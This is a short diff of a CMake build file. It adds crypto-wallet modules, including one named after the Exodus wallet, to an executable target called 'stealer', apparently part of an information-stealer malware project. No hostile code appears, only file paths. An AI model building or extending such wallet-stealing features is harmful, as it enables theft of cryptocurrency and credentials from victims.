@@ -42,6 +42,10 @@ add_executable(stealer src/main.cpp
         src/utils/OSUtil.h
         src/stealer/impl/Processes.cpp
         src/stealer/impl/Processes.h
+        src/stealer/impl/crypto/Crypto.cpp
+        src/stealer/impl/crypto/Crypto.h
+        src/stealer/impl/crypto/impl/Exodus.cpp
+        src/stealer/impl/crypto/impl/Exodus.h
 )
 
 target_link_libraries(stealer
